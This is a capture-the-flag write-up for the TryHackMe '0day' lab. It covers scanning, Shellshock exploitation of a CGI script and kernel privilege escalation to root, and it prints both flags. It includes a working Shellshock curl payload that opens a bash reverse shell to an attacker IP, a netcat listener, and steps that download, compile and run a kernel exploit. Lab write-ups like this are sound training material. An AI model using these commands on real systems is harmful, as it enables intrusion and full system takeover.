
# TryHackMe: 0day 🐚

## Overview

**0day** is a beginner-friendly CTF challenge on [TryHackMe](https://tryhackme.com/room/0day) that focuses on classic web exploitation and privilege escalation using known vulnerabilities like Shellshock.

- **Platform**: TryHackMe
- **Difficulty**: Easy–Medium
- **Category**: Web, Linux, Exploitation, Privilege Escalation
- **Machine IP**: `10.10.61.64`

---

## Objectives

✅ Discover web services and potential vulnerabilities  
✅ Exploit Shellshock via a CGI script  
✅ Gain initial foothold as `www-data`  
✅ Escalate privileges using a kernel exploit  
✅ Retrieve `user.txt` and `root.txt` flags  

---

## Tools Used

- `nmap` – for port scanning and enumeration  
- `nikto` – to discover web vulnerabilities  
- `bash reverse shell` – to get a foothold  
- `wget`, `gcc` – for compiling and running exploits  

---

## Walkthrough

### 🔍 Enumeration

```bash
nmap -T5 -sV -p80,22 -Pn -A -sS -O -vv 10.10.61.64 -oA nmapScan
```

Discovered:
- Port 22: OpenSSH 6.6.1p1
- Port 80: Apache 2.4.7
- OS: Ubuntu 14.04.1 LTS

```bash
nikto -h http://10.10.61.64
```

Found:
- `/cgi-bin/test.cgi` is vulnerable to **Shellshock**
- Interesting directories: `/backup/`, `/admin/`, `/secret/`

---

### 🧨 Shellshock Exploitation

```bash
curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<YOUR-IP>/8080 0>&1" http://10.10.61.64/cgi-bin/test.cgi
```

Meanwhile, on attack box:
```bash
nc -nvlp 8080
```

Got reverse shell as `www-data`.

---

### 🧑‍💻 User Access

```bash
cd /home/ryan
cat user.txt
# THM{Sh3llSh0ck_r0ckz}
```

---

### 🔝 Privilege Escalation

System Info:
- Ubuntu 14.04
- Kernel: 3.13.0-32-generic
- No `sudo` access
- Bash version vulnerable to known exploits

Uploaded Linux Kernel exploit `37292.c`:
```bash
wget http://<YOUR-IP>:8000/37292.c
gcc 37292.c -o exploit
./exploit
```

Spawned root shell.

```bash
cd /root
cat root.txt
# THM{g00d_j0b_0day_is_Pleased}
```

---

## Final Notes

- Web vulnerability: Shellshock (`CVE-2014-6271`)
- Local privilege escalation using kernel exploit
- Always try default vulnerable scripts and directories during enumeration

---

## Author

👤 **Faisal Khan**  
📂 Cybersecurity Enthusiast | CTF Player | Bug Bounty Hunter  
🔗 GitHub: [mrfaisal607](https://github.com/mrfaisal607)  
🌐 TryHackMe: [Profile](https://tryhackme.com/p/mrfaisal0003)

---

> “Exploit knowledge ethically. Every shell you get is a story you decode.” 🔍
